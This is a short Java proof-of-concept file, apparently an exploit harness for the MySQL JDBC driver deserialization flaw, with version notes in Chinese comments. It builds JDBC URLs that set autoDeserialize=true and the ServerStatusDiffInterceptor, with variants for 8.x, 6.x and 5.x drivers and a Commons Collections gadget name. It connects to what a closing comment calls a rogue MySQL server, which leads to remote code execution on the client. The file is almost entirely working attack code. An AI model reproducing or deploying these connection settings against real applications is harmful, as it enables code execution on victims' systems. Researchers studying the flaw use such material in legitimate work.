package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

// Test in MacOS
// OpenJDK 22
// JDBC 8.0.7 < 版本 < 8.0.20, < 5.1.49
public class MySQL_RCE {
    public static void main(String[] args) throws Exception {
        String driver = "com.mysql.cj.jdbc.Driver"; // 8.x
        // String driver = "com.mysql.jdbc.Driver"; // 5.x
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?" +
                "connectionAttributes=t:cc7&autoDeserialize=true" +
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor" +
                "&useSSL=False"; //8.x使用
        // String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=False"; //6.x使用
        // String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=False"; //>=5.1.11使用
        String User = "root";
        String Pass = "123456";
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL, User, Pass);
        conn.close();
    }
}

//./rogue_mysql_server
